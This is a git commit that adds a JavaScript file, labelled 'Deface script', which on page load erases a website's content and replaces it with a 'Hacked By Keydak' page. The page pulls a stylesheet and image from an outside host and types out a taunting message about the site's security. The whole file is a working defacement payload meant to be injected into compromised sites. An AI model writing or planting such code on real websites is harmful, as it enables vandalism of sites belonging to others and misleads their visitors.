1b587076d5e7f502adc534e778d0938a889cc1c3
Keydak <139828741+Keydak@users.noreply.github.com>
2024-06-14 00:21:11 +0800

    w

---
+++ 23.js
@@ -0,0 +1,48 @@
+// Deface script
+document.addEventListener('DOMContentLoaded', function () {
+
+    document.documentElement.innerHTML = '';
+
+
+    var newHtmlContent = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta http-equiv="X-UA-Compatible" content="IE=edge">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Home - Hacked By Keydak</title>
+            <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
+        </head>
+        <body>
+            <div class="mainContainer">
+                <div class="img">
+                    <img class="mainImage" src="https://kepo-six.vercel.app/jett.png" alt="image" style="width: 400px;">
+                </div>
+                <h1> Hacked By Keydak</h1>
+                <hr class="hr">
+                <div class="container">
+                    <p class="text1"></p>
+                </div>
+            </div>
+        </body>
+        </html>
+    `;
+
+    document.addEventListener('DOMContentLoaded', function() {
+        var text = "you need to improve the security system on your site";
+        var textElement = document.querySelector('.text1');
+        var index = 0;
+
+        function type() {
+            if (index < text.length) {
+                textElement.textContent += text.charAt(index);
+                index++;
+                setTimeout(type, 150);
+            }
+        }
+
+        type();
+    });
+    document.documentElement.innerHTML = newHtmlContent;
+});
